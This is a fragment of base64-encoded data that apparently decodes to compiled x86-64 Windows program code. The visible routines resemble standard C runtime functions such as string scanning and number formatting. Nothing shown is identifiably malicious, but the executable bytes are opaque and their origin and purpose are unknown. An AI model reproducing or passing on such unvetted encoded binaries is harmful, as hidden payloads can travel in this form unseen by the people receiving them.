BBXSIPsIIvyTI0N2AABAEiL2UiNFc4AAQC5GAAAAEyNBboAAQDoNfn//0iL+EiFwHQSSIvI/xU06gAAi9ZIi8v/1+sISIvL6Jd6AABIi1wkMEiLdCQ4SIPEIF/DzMzMSIl8JAhIixWM5gEASI09Zf0BAIvCuUAAAACD4D8ryDPASNPIuSAAAABIM8LzSKtIi3wkCLABw8xIiVwkEFdIg+wgiwUw/gEAM9uFwHQIg/gBD5TA61xMjQ2b/wAAuQgAAABMjQWH/wAASI0ViP8AAOiL+P//SIv4SIXAdChIi8iJXCQw/xWG6QAAM9JIjUwkMP/Xg/h6dQ2NSIewAYcN1f0BAOsNuAIAAACHBcj9AQAywEiLXCQ4SIPEIF/DzMzMQFNIg+wghMl1L0iNHQf8AQBIiwtIhcl0EEiD+f90Bv8Vm+cAAEiDIwBIg8MISI0FhPwBAEg72HXYsAFIg8QgW8PMzMxIiVwkEEiJdCQYVVdBVkiNrCQQ+///SIHs8AUAAEiLBXDlAQBIM8RIiYXgBAAAQYv4i/KL2YP5/3QF6OWK//8z0kiNTCRwQbiYAAAA6EOT//8z0kiNTRBBuNAEAADoMpP//0iNRCRwSIlEJEhIjU0QSI1FEEiJRCRQ/xU95gAATIu1CAEAAEiNVCRASYvORTPA/xUt5gAASIXAdDZIg2QkOABIjUwkYEiLVCRATIvISIlMJDBNi8ZIjUwkWEiJTCQoSI1NEEiJTCQgM8n/FfrlAABIi4UIBQAASImFCAEAAEiNhQgFAABIg8AIiXQkcEiJhagAAABIi4UIBQAASIlFgIl8JHT/FenlAAAzyYv4/xXH5QAASI1MJEj/FbTlAACFwHUQhf91DIP7/3QHi8vo8In//0iLjeAEAABIM8zoIYD//0yNnCTwBQAASYtbKEmLczBJi+NBXl9dw8xIiQ0Z/AEAw0iLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7DBBi/lJi/BIi+pMi/Ho/gkAAEiFwHRBSIuYuAMAAEiF23Q1SIvL/xVk5wAARIvPTIvGSIvVSYvOSIvDSItcJEBIi2wkSEiLdCRQSIt8JFhIg8QwQV5I/+BIix254wEAi8tIMx2Y+wEAg+E/SNPLSIXbdbBIi0QkYESLz0yLxkiJRCQgSIvVSYvO6CIAAADMzEiD7DhIg2QkIABFM8lFM8Az0jPJ6D////9Ig8Q4w8zMSIPsKLkXAAAA6BfMAACFwHQHuQUAAADNKUG4AQAAALoXBADAQY1IAein/f///xWF5AAASIvIuhcEAMBIg8QoSP8lyuMAAMzMSIlcJAhXSIPsMINkJCAAuQgAAADo//T//5C7AwAAAIlcJCQ7HV/1AQB0bkhj+0iLBVv1AQBIiwT4SIXAdQLrVYtIFMHpDfbBAXQZSIsNPvUBAEiLDPnoCcP//4P4/3QE/0QkIEiLBSX1AQBIiwz4SIPBMP8VX+QAAEiLDRD1AQBIiwz56KPy//9IiwUA9QEASIMk+AD/w+uGuQgAAADoyfT//4tEJCBIi1wkQEiDxDBfw8zMSIlcJAhIiXQkEFdIg+wgSIvZi0EUJAM8AnVKi0EUqMB0Q4s5K3kIg2EQAEiLcQhIiTGF/34v6HEcAACLyESLx0iL1uhMNgAAO/h0CvCDSxQQg8j/6xGLQxTB6AKoAXQF8INjFP0zwEiLXCQwSIt0JDhIg8QgX8PMQFNIg+wgSIvZSIXJdQpIg8QgW+lAAAAA6Gv///+FwHQFg8j/6x+LQxTB6AuoAXQTSIvL6PwbAACLyOhhdgAAhcB13jPASIPEIFvDzLkBAAAA6QIAAADMzEiLxEiJWAhIiXAYV0FWQVdIg+xAi/GDYMwAg2DIALkIAAAA6Gzz//+QSIs93PMBAEhjBc3zAQBMjTTHQYPP/0iJfCQoSTv+dHFIix9IiVwkaEiJXCQwSIXbdQLrV0iLy+jnmv//kItDFMHoDagBdDyD/gF1E0iLy+gr////QTvHdCr/RCQk6ySF9nUgi0MU0eioAXQXSIvL6Av///+LVCQgQTvHQQ9E14lUJCBIi8vopJr//0iDxwjrhbkIAAAA6CTz//+LRCQgg/4BD0REJCRIi1wkYEiLdCRwSIPEQEFfQV5fw0BTSIPsIEiL2YtBFMHoDagBdCeLQRTB6AaoAXQdSItJCOie8P//8IFjFL/+//8zwEiJQwhIiQOJQxBIg8QgW8NIi8RIiVgISIloEEiJcBhIiXggQVZIgeyQAAAASI1IiP8VuuEAAEUz9mZEOXQkYg+EmAAAAEiLRCRoSIXAD4SKAAAASGMYSI1wBL8AIAAASAPeOTgPTDiLz+iuJwAAOz0E/AEAD089/fsBAIX/dF5Bi+5Igzv/dEVIgzv+dD/2BgF0OvYGCHUNSIsL/xUH4gAAhcB0KEiLzUiNFcn3AQCD4T9Ii8VIwfgGSMHhBkgDDMJIiwNIiUEoigaIQThI/8VI/8ZIg8MISIPvAXWlTI2cJJAAAABJi1sQSYtrGEmLcyBJi3soSYvjQV7DzEiJXCQISIl0JBBIiXwkGEFWSIPsIDP/RTP2SGPfSI0NWPcBAEiLw4PjP0jB+AZIweMGSAMcwUiLQyhIg8ACSIP4AXYJgEs4gOmJAAAAxkM4gYvPhf90FoPpAXQKg/kBufT////rDLn1////6wW59v////8V5N8AAEiL8EiNSAFIg/kBdgtIi8j/FR7hAADrAjPAhcB0HQ+2yEiJcyiD+QJ1BoBLOEDrLoP5A3UpgEs4COsjgEs4QEjHQyj+////SIsFNvEBAEiFwHQLSYsEBsdAGP7/////x0mDxgiD/wMPhTX///9Ii1wkMEiLdCQ4SIt8JEBIg8QgQV7DzEBTSIPsILkHAAAA6Hjw//8z2zPJ6AsmAACFwHUM6Pb9///o3f7//7MBuQcAAADoqfD//4rDSIPEIFvDzEiJXCQIV0iD7CAz20iNPTH2AQBIiww7SIXJdArodyUAAEiDJDsASIPDCEiB+wAEAABy2bABSItcJDBIg8QgX8NIiVwkCEyJTCQgV0iD7CBJi9lJi/iLCujw7///kEiLB0iLCEiLiYgAAABIhcl0HoPI//APwQGD+AF1EkiNBfLhAQBIO8h0BujU7f//kIsL6Azw//9Ii1wkMEiDxCBfw8xIiVwkCEyJTCQgV0iD7CBJi9lJi/iLCuiQ7///kEiLRwhIixBIiw9IixJIiwnofgIAAJCLC+jG7///SItcJDBIg8QgX8PMzMxIiVwkCEyJTCQgV0iD7CBJi9lJi/iLCuhI7///kEiLB0iLCEiLgYgAAADw/wCLC+iE7///SItcJDBIg8QgX8PMSIlcJAhMiUwkIFdIg+wgSYvZSYv4iwroCO///5BIiw8z0kiLCej+AQAAkIsL6Ebv//9Ii1wkMEiDxCBfw8zMzEBVSIvsSIPsUEiJTdhIjUXYSIlF6EyNTSC6AQAAAEyNRei4BQAAAIlFIIlFKEiNRdhIiUXwSI1F4EiJRfi4BAAAAIlF0IlF1EiNBa34AQBIiUXgiVEoSI0Nf+4AAEiLRdhIiQhIjQ2h4AEASItF2ImQqAMAAEiLRdhIiYiIAAAAjUpCSItF2EiNVShmiYi8AAAASItF2GaJiMIBAABIjU0YSItF2EiDoKADAAAA6M7+//9MjU3QTI1F8EiNVdRIjU0Y6HH+//9Ig8RQXcPMzMxIhcl0GlNIg+wgSIvZ6A4AAABIi8voDuz//0iDxCBbw0BVSIvsSIPsQEiNRehIiU3oSIlF8EiNFdDtAAC4BQAAAIlFIIlFKEiNRehIiUX4uAQAAACJReCJReRIiwFIO8J0DEiLyOi+6///SItN6EiLSXDosev//0iLTehIi0lY6KTr//9Ii03oSItJYOiX6///SItN6EiLSWjoiuv//0iLTehIi0lI6H3r//9Ii03oSItJUOhw6///SItN6EiLSXjoY+v//0iLTehIi4mAAAAA6FPr//9Ii03oSIuJwAMAAOhD6///TI1NIEyNRfBIjVUoSI1NGOgO/f//TI1N4EyNRfhIjVXkSI1NGOjh/f//SIPEQF3DzMzMSIlcJAhXSIPsIEiL+UiL2kiLiZAAAABIhcl0LOiHbAAASIuPkAAAAEg7DeX2AQB0F0iNBWzcAQBIO8h0C4N5EAB1BehgagAASImfkAAAAEiF23QISIvL6MBpAABIi1wkMEiDxCBfw8xIiVwkCFdIg+wg/xV02wAAiw0W3AEAi9iD+f90Dehu8P//SIv4SIXAdUG6yAMAALkBAAAA6G/r//9Ii/hIhcB1CTPJ6GDq///rPIsN3NsBAEiL0OiQ8P//SIvPhcB05OhM/f//M8noPer//0iF/3QWi8v/FcTbAABIi1wkMEiLx0iDxCBfw4vL/xWu2wAA6CXL///MSIlcJAhIiXQkEFdIg+wg/xXb2gAAiw192wEAM/aL2IP5/3QN6NPv//9Ii/hIhcB1QbrIAwAAuQEAAADo1Or//0iL+EiFwHUJM8noxen//+smiw1B2wEASIvQ6PXv//9Ii8+FwHTk6LH8//8zyeii6f//SIX/dQqLy/8VKdsAAOsLi8v/FR/bAABIi/dIi1wkMEiLxkiLdCQ4SIPEIF/DzEiD7ChIjQ1B/f//6Jzu//+JBeLaAQCD+P91BDLA6xXoPP///0iFwHUJM8noDAAAAOvpsAFIg8Qow8zMzEiD7CiLDbLaAQCD+f90DOi07v//gw2h2gEA/7ABSIPEKMPMzEBTSIPsMEGL2EyLwkiL0UiNTCQg6Fu1//9Ii9BBsQFEi8Mzyehftf//SIPEMFvDzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7FBFM/ZJi+hIi/JIi/lIhdJ0E02FwHQORDgydSZIhcl0BGZEiTEzwEiLXCRgSItsJGhIi3QkcEiLfCR4SIPEUEFew0mL0UiNTCQw6NWX//9Ii0QkOEw5sDgBAAB1FUiF/3QGD7YGZokHuwEAAADppAAAAA+2DkiNVCQ46JVGAAC7AQAAAIXAdFFIi0wkOESLSQhEO8t+L0E76Xwqi0kMjVMIQYvGSIX/TIvGD5XAiUQkKEiJfCQg/xVE2gAASItMJDiFwHUPSGNBCEg76HI6RDh2AXQ0i1kI6z1Bi8ZIhf9Ei8tMi8YPlcC6CQAAAIlEJChIi0QkOEiJfCQgi0gM/xX82QAAhcB1DuiPzP//g8v/xwAqAAAARDh0JEh0DEiLTCQwg6GoAwAA/YvD6ff+//9FM8npsP7//0iJXCQISIl0JBhmRIlMJCBXSIPsYEmL+EiL8kiL2UiF0nUTTYXAdA5Ihcl0AiERM8DpjwAAAEiFyXQDgwn/SYH4////f3YT6BjM//+7FgAAAIkY6Kjz///raUiLlCSQAAAASI1MJEDogJb//0iLRCRISIO4OAEAAAB1eQ+3hCSIAAAAuf8AAABmO8F2SkiF9nQSSIX/dA1Mi8cz0kiLzujkhP//6LvL//+7KgAAAIkYgHwkWAB0DEiLTCRAg6GoAwAA/YvDTI1cJGBJi1sQSYtzIEmL41/DSIX2dAtIhf8PhIkAAACIBkiF23RVxwMBAAAA602DZCR4AEiNTCR4SIlMJDhMjYQkiAAAAEiDZCQwAEG5AQAAAItIDDPSiXwkKEiJdCQg/xWl2AAAhcB0GYN8JHgAD4Vq////SIXbdAKJAzPb6Wj/////FSLXAACD+HoPhU3///9IhfZ0EkiF/3QNTIvHM9JIi87oGoT//+jxyv//uyIAAACJGOiB8v//6Sz///9Ig+w4SINkJCAA6G3+//9Ig8Q4w0BVSIPsIEiNbCQgSIPl4IsF49UBAEyLyYP4BQ+MjAAAAEyLwbggAAAAQYPgH0krwEn32E0b0kwj0Ek70kwPQtJJjQQK6wiAOQB0CEj/wUg7yHXzSSvJSTvKD4XxAAAATIvCSQPJTSvCSYvAg+AfTCvATAPBxexX0usQxe10CcX918GFwHUJSIPBIEk7yHXrSY0EEesIgDkAdAhI/8FIO8h180krycX4d+mjAAAAg/gBD4yEAAAAg+EPuBAAAABIK8FI99lJi8lNG9JMI9BJO9JMD0LSS40ECkw7yHQNgDkAdAhI/8FIO8h180kryUk7ynVeTIvCSQPJTSvCD1fJSYvAg+APTCvATAPB6xRmD2/BZg90AWYP18CFwHUJSIPBEEk7yHXnSY0EEesIgDkAdB1I/8FIO8h18+sTSI0EEesIgDkAdAhI/8FIO8h180kryUiLwUiDxCBdw8zMzEBVSIPsIEiNbCQgSIPl4IsFh9QBAEyL0kyLwYP4BQ+M0AAAAPbBAXQrSI0EUUiL0Ug7yA+EqAEAAEUzyWZEOQoPhJsBAABIg8ICSDvQde3pjQEAAIPhH7ggAAAASCvBSPfZTRvbTCPYSdHrSTvTTA9C2kUzyUmL0EuNBFhMO8B0D2ZEOQp0CUiDwgJIO9B18Ukr0EjR+kk70w+FSAEAAEmLykmNFFBJK8tIi8GD4B9IK8jF7FfSTI0cSusQxe11CsX918GFwHUJSIPCIEk703XrS40EUOsKZkQ5CnQJSIPCAkg70HXxSSvQSNH6xfh36fMAAACD+AEPjMYAAAD2wQF0K0iNBFFIi9FIO8gPhM8AAABFM8lmRDkKD4TCAAAASIPCAkg70HXt6bQAAACD4Q+4EAAAAEgrwUj32U0b20wj2EnR60k700wPQtpFM8lJi9BLjQRYTDvAdA9mRDkKdAlIg8ICSDvQdfFJK9BI0fpJO9N1c0mLykmNFFBJK8sPV8lIi8GD4A9IK8hMjRxK6xRmD2/BZg91AmYP18CFwHUJSIPCEEk703XnS40EUOsKZkQ5CnQJSIPCAkg70HXxSSvQ6yFIjQRRSIvRSDvIdBJFM8lmRDkKdAlIg8ICSDvQdfFIK9FI0fpIi8JIg8QgXcNAU0iD7CBIiwWn7gEASIvaSDkCdBaLgagDAACFBYPcAQB1COjIZAAASIkDSIPEIFvDzMzMQFNIg+wgSIsFq9gBAEiL2kg5AnQWi4GoAwAAhQVP3AEAdQjooFEAAEiJA0iDxCBbw8zMzEiLEbn/BwAASIvCSMHoNEgjwUg7wXQDM8DDSLn///////8PAEiLwkgjwXUGuAEAAADDSLkAAAAAAAAAgEiF0XQVSLkAAAAAAAAIAEg7wXUGuAQAAADDSMHqM/fSg+IBg8oCi8LDzMzMSIvESIlYCEiJaBBIiXAYSIl4IEFUQVZBV0iD7HCLnCS4AAAARTPkSIv6RIgiSIuUJNAAAABIi/GF20iNSMhNi/FJi+hBD0jc6OuQ//+NQwtIY9BIO+p3FuhTxv//QY1cJCKJGOjj7f//6bsCAABIiwa5/wcAAEjB6DRII8FIO8F1d4uEJMgAAABNi85MiWQkQEyLxYlEJDhIi9dIi4QksAAAAEiLzkSIZCQwiVwkKEiJRCQg6KcCAACL2IXAdAhEiCfpYgIAALplAAAASIvP6HjBAABIhcAPhEkCAACKjCTAAAAA9tka0oDi4IDCcIgQRIhgA+ktAgAASLgAAAAAAAAAgEiFBnQGxgctSP/HRIq8JMAAAAC9/wMAAEGKx0G6MAAAAPbYSbv///////8PAEi4AAAAAAAA8H8b0oPi4IPq2UiFBnUaRIgXSP/HSIsGSSPDSPfYSBvtgeX+AwAA6wbGBzFI/8dMi/dI/8eF23UFRYgm6xRIi0QkWEiLiPgAAABIiwGKCEGIDkyFHg+GigAAAEUPt8JJuQAAAAAAAA8Ahdt+LkiLBkGKyEkjwUkjw0jT6GZBA8Jmg/g5dgNmA8KIB//LSP/HScHpBGZBg8D8ec5mRYXAeERIiwZBishJI8FJI8NI0+hmg/gIdi9IjU//igEsRqjfdQhEiBFI/8nr8Ek7znQTigE8OXUHgMI6iBHrCf7AiAHrA/5B/4XbfhdMi8NBitJIi8/opX3//0gD+0G6MAAAAEU4JkkPRP5B9t8awCTgBHCIB0iLDkjB6TSB4f8HAABIK814CsZHAStIg8cC6wvGRwEtSIPHAkj32USIF0yLx0iB+egDAAB8M0i4z/dT46WbxCBI9+lIwfoHSIvCSMHoP0gD0EGNBBKIB0j/x0hpwhj8//9IA8hJO/h1BkiD+WR8Lki4C9ejcD0K16NI9+lIA9FIwfoGSIvCSMHoP0gD0EGNBBKIB0j/x0hrwpxIA8hJO/h1BkiD+Qp8K0i4Z2ZmZmZmZmZI9+lIwfoCSIvCSMHoP0gD0EGNBBKIB0j/x0hrwvZIA8hBAsqID0SIZwFBi9xEOGQkaHQMSItMJFCDoagDAAD9TI1cJHCLw0mLWyBJi2soSYtzMEmLezhJi+NBX0FeQVzDzMzMTIvcSYlbCEmJaxBJiXMYV0iD7FBIi4QkgAAAAEmL8IusJIgAAABNjUPoSIsJSIv6SYlDyI1VAegIaQAAM8lMjUwkQIN8JEAtRI1FAUiL1g+UwTPAhe0Pn8BIK9BIK9FIg/7/SA9E1kgDyEgDz+hCYwAAhcB0BcYHAOs9SIuEJKAAAABEi8VEiowkkAAAAEiL1kiJRCQ4SIvPSI1EJEDGRCQwAEiJRCQoi4QkmAAAAIlEJCDoGAAAAEiLXCRgSItsJGhIi3QkcEiDxFBfw8zMzEiLxEiJWAhIiWgQSIlwGEiJeCBBV0iD7FAzwElj2EWFwEWK+UiL6kiL+Q9Pw4PACUiYSDvQdy7oRML//7siAAAAiRjo1On//4vDSItcJGBIi2wkaEiLdCRwSIt8JHhIg8RQQV/DSIuUJJgAAABIjUwkMOiRjP//gLwkkAAAAABIi7QkiAAAAHQyM9KDPi0PlMIzwEgD14XbD5/AhcB0HEmDyP9J/8BCgDwCAHX2SGPISf/ASAPK6Im3AACDPi1Ii9d1B8YHLUiNVwGF234bikIBiAJI/8JIi0QkOEiLiPgAAABIiwGKCIgKM8lMjQUG5wAAOIwkkAAAAA+UwUgD2kgD2Ugr+0iLy0iD/f9IjRQvSA9E1eg33f//hcAPhaQAAABIjUsCRYT/dAPGA0VIi0YIgDgwdFdEi0YEQYPoAXkHQffYxkMBLUGD+GR8G7gfhetRQffowfoFi8LB6B8D0ABTAmvCnEQDwEGD+Ap8G7hnZmZmQffowfoCi8LB6B8D0ABTA2vC9kQDwEQAQwSDvCSAAAAAAnUUgDkwdQ9IjVEBQbgDAAAA6Jm2AACAfCRIAHQMSItEJDCDoKgDAAD9M8Dphf7//0iDZCQgAEUzyUUzwDPSM8noYuj//8zMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsQEiLVCR4SIvZSI1I2E2L8UGL+Oj8iv//QYtOBP/JgHwkcAB0GTvPdRUzwEhjyUGDPi0PlMBIA8NmxwQBMABBgz4tdQbGAy1I/8NIg87/QYN+BAB/JEyLxkn/wEKAPAMAdfZJ/8BIjUsBSIvT6N+1AADGAzBI/8PrB0ljRgRIA9iF/358SI1rAUyLxkn/wEKAPAMAdfZJ/8BIi9NIi83orbUAAEiLRCQoSIuI+AAAAEiLAYoIiAtBi04Ehcl5QoB8JHAAdQiLwffYO8d9BIv599+F/3QbSP/GgDwuAHX3SGPPTI1GAUgDzUiL1ehgtQAATGPHujAAAABIi83osHj//4B8JDgAdAxIi0QkIIOgqAMAAP1Ii1wkUDPASItsJFhIi3QkYEiLfCRoSIPEQEFew0yL3EmJWwhJiWsQSYlzGEFWSIPsUEiLCTPASYlD6EmL6EmJQ/BNjUPoSIuEJIAAAABIi/KLlCSIAAAASYlDyOgMZQAARIt0JERMjUwkQESLhCSIAAAAM8mDfCRALUiL1Q+UwUH/zkgr0UiD/f9IjRwxSA9E1UiLy+hDXwAAhcB0CMYGAOmYAAAAi0QkRP/IRDvwD5zBg/j8fEU7hCSIAAAAfTyEyXQMigNI/8OEwHX3iEP+SIuEJKAAAABMjUwkQESLhCSIAAAASIvVSIlEJChIi87GRCQgAejb/f//60JIi4QkoAAAAEiL1USKjCSQAAAASIvORIuEJIgAAABIiUQkOEiNRCRAxkQkMAFIiUQkKIuEJJgAAACJRCQg6Lv7//9Ii1wkYEiLbCRoSIt0JHBIg8RQQV7DzEBVSI1sJLFIgezAAAAASIsFM8kBAEgzxEiJRT9Ni9EPtsJIg8AETYvITDvQcx5BxgAAuAwAAABIi00/SDPM6NVk//9IgcTAAAAAXcOE0nQOSf/BQcYALUn/ykHGAQD2XX9IjRXs4gAATI0F6eIAAEiJVd9IjQXS4gAASIlV50iJRb9IiUXHSI0Fw+IAAEiJRc9IiUXXSI0FxOIAAEiJRf9IjQXJ4gAASIlFD0iNBc7iAABIiUUfSI0F0+IAAEiJRS9IiVUHSIlVJ41R/xvJTIlF70jB4gL30YPhAkyJRfeLwUgDwkyJRRdMiUU3TItExb9Ig8j/SP/AQYA8AAB19kw70A+XwEUzwITAQQ+UwEQDwUmLyUwDwkmL0k6LRMW/6NDY//+FwA+EC////0iDZCQgAEUzyUUzwDPSM8non+T//8zMzEiJXCQISIlsJBBIiXQkGFdBVEFVQVZBV0iD7GBNi+lJi+hIi/JMi/lIhdJ1GOiuvP//uxYAAACJGOg+5P//i8Pp3gEAAE2FwHTjTYXJdN5Mi6QksAAAAE2F5HTRi5wkuAAAAIP7QXQNjUO7g/gCdgVFMvbrA0G2AUiLvCTIAAAAQPbHCHUq6D31//+FwHQhSYsXTIvNSMHqP0yLxoDiAUSIdCQgi8joEf7//+lzAQAASMHvBIPnAYPPAoPrQQ+EKQEAAIPrBA+E5wAAAIPrAXRYg+sBdBeD6xoPhA0BAACD6wQPhMsAAACD+wF0PEiLhCTQAAAATYvNSIlEJEBMi8WLhCTAAAAASIvWiXwkOEmLz0SIdCQwiUQkKEyJZCQg6GD8///p+gAAAIucJMAAAABMjUQkUEmLDzPAi9NIiUQkUE2LzUiJRCRYTIlkJCDogWEAAESLRCRUTI1MJFAzyUiL1YN8JFAtD5TBRAPDSCvRSIP9/0gPRNVIA87oxFsAAIXAdAjGBgDplwAAAEiLhCTQAAAATI1MJFBIiUQkKESLw0iL1cZEJCAASIvO6Iv6///rcEiLhCTQAAAATYvNSIlEJEBMi8WLhCTAAAAASIvWiXwkOEmLz0SIdCQwiUQkKEyJZCQg6Kb3///rN0iLhCTQAAAATYvNSIlEJEBMi8WLhCTAAAAASIvWiXwkOEmLz0SIdCQwiUQkKEyJZCQg6A30//9MjVwkYEmLWzBJi2s4SYtzQEmL40FfQV5BXUFcX8PMzMxIg+woSIXJdRXojrr//8cAFgAAAOgf4v//g8j/6wOLQRhIg8Qow8zMSIsNkcUBADPASIPJAUg5DXzhAQAPlMDDSIlcJAhXSIPsIEiL2eiu////i8joK3QAAIXAD4ShAAAAuQEAAADolX7//0g72HUJSI09SeEBAOsWuQIAAADofX7//0g72HV6SI09OeEBAP8Fo9cBAItDFKnABAAAdWPwgUsUggIAAEiLB0iFwHU5uQAQAADoU9X//zPJSIkH6AnV//9IiwdIhcB1HUiNSxzHQxACAAAASIlLCEiJC8dDIAIAAACwAescSIlDCEiLB0iJA8dDEAAQAADHQyAAEAAA6+IywEiLXCQwSIPEIF/DzITJdDRTSIPsIEiL2otCFMHoCagBdB1Ii8roJuL///CBYxR//f//g2MgAEiDYwgASIMjAEiDxCBbw8zMzEBTSIPsUEiLBWfEAQBIM8RIiUQkQEUz0kmL2EGLwkyL2kiD+CBMi8kPg9EAAABEiFQEIEj/wEiD+CB87EUPtgNJ/8NBi9BBi8BIweoDg+AHD7ZMFCAPq8GITBQgRYTAddtNhcl1A0yLC0UPtgG6AQAAAEGLyEnB6AOD4QfT4kKEVAQgdClFigFFhMB0IUn/wboBAAAARQ+2AUGLwEGLyIPhB0jB6APT4oRUBCB12k2L2esfRQ+2AboBAAAAQYvIScHoA4PhB9PiQoRUBCB1Ckn/wUU4EXXc6wZFiBFJ/8FNO8tMiQtND0XTSYvCSItMJEBIM8zoS1///0iDxFBbw+hsYP//zMzMzEiD7Cjox+j//0iNVCQwSIuIkAAAAEiJTCQwSIvI6Kbw//9Ii0QkMEiLAEiDxCjDzEiJXCQQV0iD7CC4//8AAA+32mY7yHUEM8DrSrgAAQAAZjvIcxBIiwUgxgEAD7fJD7cESOsrM/9miUwkQEyNTCQwZol8JDBIjVQkQI1PAUSLwf8VbcUAAIXAdLwPt0QkMA+3yyPBSItcJDhIg8QgX8NIiXQkEEiJfCQYTIl0JCBVSIvsSIHsgAAAAEiLBavCAQBIM8RIiUXwRIvySGP5SYvQSI1NyOj2gf//jUcBPQABAAB3EEiLRdBIiwgPtwR56YIAAACL90iNVdDB/ghAD7bO6LowAAC6AQAAAIXAdBJAiHXARI1KAUCIfcHGRcIA6wtAiH3ARIvKxkXBADPAiVQkMIlF6EyNRcBmiUXsSItF0ItIDEiNReiJTCQoSI1N0EiJRCQg6HZPAACFwHUUOEXgdAtIi0XIg6CoAwAA/TPA6xgPt0XoQSPGgH3gAHQLSItNyIOhqAMAAP1Ii03wSDPM6KZd//9MjZwkgAAAAEmLcxhJi3sgTYtzKEmL413DzEiJXCQITIlMJCBXSIPsIEmL+UmL2IsK6OwJAACQSIsDSGMISIvRSIvBSMH4BkyNBXjZAQCD4j9IweIGSYsEwPZEEDgBdAnozQAAAIvY6w7oRLb//8cACQAAAIPL/4sP6IgKAACLw0iLXCQwSIPEIF/DzMzMiUwkCEiD7DhIY9GD+v51Fejvtf//gyAA6Ae2///HAAkAAADrdIXJeFg7FQndAQBzUEiLykyNBf3YAQCD4T9Ii8JIwfgGSMHhBkmLBMD2RAg4AXQtSI1EJECJVCRQiVQkWEyNTCRQSI1UJFhIiUQkIEyNRCQgSI1MJEjoDf///+sb6H61//+DIADolrX//8cACQAAAOgn3f//g8j/SIPEOMPMzMxIiVwkCFdIg+wgSGP5i8/o0AsAAEiD+P91BDPb61dIiwVv2AEAuQIAAACD/wF1CUCEuLgAAAB1Cjv5dR32QHgBdBfonQsAALkBAAAASIvY6JALAABIO8N0wYvP6IQLAABIi8j/FfPAAACFwHWt/xUZwQAAi9iLz+isCgAASIvXTI0FDtgBAIPiP0iLz0jB+QZIweIGSYsMyMZEETgAhdt0DIvL6Gi0//+DyP/rAjPASItcJDBIg8QgX8PMzEBTSIPsIEiL2UiDIQC5CAAAAOjJ0f//kEiNTCQw6H4AAABIiwhIiQtIhcl0GYNhEABIi8FIg2EoAEiDIQBIg2EIAINJGP+5CAAAAOjk0f//SIvDSIPEIFvDzMzMSIlMJAhMi9wz0kiJEUmLQwhIiVAISYtDCIlQEEmLQwiDSBj/SYtDCIlQHEmLQwiJUCBJi0MISIlQKEmLQwiHUBTDzMxIiVwkCEiJbCQQSIl0JBhXSIPsIEiLPZ3RAQBIi/FIYy2L0QEASIPHGEiDxf1IjSzvSDv9D4SUAAAASIsfSIXbdD2LQxTB6A2oAXUtSIvL6KR4//8PDUsUi0MUi8gPuukN8A+xSxR188HoDfbQqAF1WEiLy+iLeP//SIPHCOuyulgAAACNSqnoyM///zPJSIkH6L7O//9IiwdIhcB0MINIGP9FM8BIiw+6oA8AAEiDwTDoKtb//0iLH/CBSxQAIAAASIvL6C94//9IiR7rBEiDJgBIi1wkMEiLxkiLdCRASItsJDhIg8QgX8PMzEiJXCQISIl0JBBXSIHsQAIAAEiLBUO+AQBIM8RIiYQkMAIAADP/SI1MJCIz0maJfCQgQbgIAgAA6B9s//9IjVQkILkFAQAA/xWfwAAAPQQBAAB3Jg+3TCQgZoXJdHlmg3wkIjp1cY1Bn2aD+BkPt8F3A4PoII14wOtdjXABugIAAACLzujfzv//SIvYSIXAdA9Ii9CLzv8VUMAAAIXAdQ3ok7L//8cADAAAAOsiZjk7dB1mg3sCOnUWD7cDZoPoYWaD+BkPtwN3A4PoII14wEiLy+iRzf//i8dIi4wkMAIAAEgzzOhDWf//TI2cJEACAABJi1sQSYtzGEmL41/DzMxIiVwkCFdIg+wgSYvYSIvCSIv5TYXAdRToG7L//8cAFgAAAOis2f//M8DrRbn/////SDvZdg3o/bH//8cAIgAAAOvlRTPJTIvHi9NIi8j/FaC/AACLyEg7y3PbhcB1D/8V370AAIvI6Fyx///rukiLx0iLXCQwSIPEIF/DSIlcJAhIiWwkEEiJdCQYV0iD7CAz/0mL2EiL8kiF0g+EkgAAAGY5Og+EiQAAAEiFyXQK6Ez////pjAAAAEUzyUUzwDPSSIvO/xUqvwAAhcB1D/8VcL0AAIvI6O2w///ra4vougIAAABIO91ID0frSIvN6J0pAABIi9hIhcB1FOg4sf//M8nHAAwAAADoy63//+s5RIvFSIvWSIvI6OP+//9IhcB1BUiLy+vhM8noqq3//0iL++sVuP///39IO9gPQsOL0Oh7bQAASIv4SItcJDBIi8dIi2wkOEiLdCRASIPEIF/DTIvCRTPJZkQ5CXQoSYvAZkU5CHQVQQ+3EGY7EXQSSIPAAg+3EGaF0nXvSIPBAuvWSIvBwzPAw8xIg+woiwXSzwEATIvKTIvRRTPAhcB1ZUiFyXUa6H+w///HABYAAADoENj//7j///9/SIPEKMNIhdJ04Uwr0kMPtxQKjUK/ZoP4GXcEZoPCIEEPtwmNQb9mg/gZdwRmg8EgSYPBAmaF0nQFZjvRdM8Pt8kPt8IrwUiDxCjDSIPEKOkDAAAAzMzMSIvESIlYCEiJaBBIiXAYV0iD7EBIi/pIi/FJi9BIjUjY6Hp6//8z7UiF9nQFSIX/dRfo4a///8cAFgAAAOhy1///uP///3/rfEiLRCQoSDmoOAEAAHU0SCv3D7ccPo1Dv2aD+Bl3BGaDwyAPtw+NQb9mg/gZdwRmg8EgSIPHAmaF23Q5ZjvZdNHrMg+3DkiNVCQo6DBsAAAPtw9IjVQkKA+32EiNdgLoHGwAAEiNfwIPt8hmhdt0BWY72HTOD7fJD7fDK8FAOGwkOHQMSItMJCCDoagDAAD9SItcJFBIi2wkWEiLdCRgSIPEQF/DzMzMSIlcJAhIiWwkEEiJdCQYV0FWQVdIg+wwM/9Ii/JIi+lIhcl1F+j+rv//xwAWAAAA6I/W//8zwOmhAAAASIXSdOToDs7//4XAiXwkKESL/0iJPkEPlMdIiXwkIEGLz0GDyf9Mi8Uz0v8VH7wAAExj8IXAdQ//Fbq6AACLyOg3rv//67JJi85IA8noCsr//0iL2EiFwHQ9RIl0JChBg8n/TIvFSIlEJCAz0kGLz/8V2rsAAIXAdQ//FXi6AACLyOj1rf//6w5Ii8NIi99IiQa/AQAAAEiLy+h9yf//i8dIi1wkUEiLbCRYSIt0JGBIg8QwQV9BXl/DzMxIiVwkCEiJbCQQSIl0JBhXSIPsILpAAAAAi8roQMr//zP2SIvYSIXAdExIjagAEAAASDvFdD1IjXgwSI1P0EUzwLqgDwAA6KHQ//9Ig0/4/0iJN8dHCAAACgrGRwwKgGcN+ECIdw5IjX9ASI1H0Eg7xXXHSIvzM8no48j//0iL